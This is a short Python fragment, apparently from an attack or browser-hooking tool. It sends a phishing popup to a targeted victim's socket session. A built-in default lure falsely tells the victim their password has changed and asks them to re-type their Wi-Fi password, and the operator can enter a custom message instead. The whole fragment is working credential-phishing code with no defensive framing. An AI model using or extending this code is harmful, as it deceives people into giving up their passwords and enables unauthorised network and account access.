DEFAULT_MESSAGE = "<h1> Password Changed! </h1> <p>Please re-type your password to reconnect to Wi-Fi Network</p>"

def send_phishing_popup(sid, socketio, logger):
    message = input("Message to show in popup (Empty for default): ").strip()
    if message == '':
        message = DEFAULT_MESSAGE
    logger.info(f'Showing phishing popup on sid: {sid} with message {message}')
    socketio.emit('phishing-popup', {'message': message}, to=sid)